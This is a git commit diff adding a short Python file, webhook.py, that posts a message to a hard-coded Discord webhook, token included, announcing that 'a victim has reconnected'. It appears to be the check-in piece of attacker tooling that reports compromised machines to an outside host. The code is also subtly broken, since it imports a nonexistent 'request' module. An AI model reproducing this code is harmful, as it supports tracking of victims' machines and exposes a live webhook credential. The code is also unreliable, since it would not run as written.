4120a7b2914a348a9e50dd33f27820dd62a12690
Miro-Os <82115248+Miro-Os@users.noreply.github.com>
2021-08-21 23:41:18 +0200

    Update webhook.py

--- webhook.py
+++ webhook.py
@@ -1,1 +1,7 @@
+import request
+discord = "https://discord.com/api/webhooks/878374540751798343/wL7H14mmDO_ShcwMWV5K2hzzb81bW6olmPuzD-PcUV2xY9LoNCz0cDinv76Mm-mwctpu"
+Message = {
+  "content": "Une victime s'est reconnecté."
+}
 
+request.post(discord, data=Message)
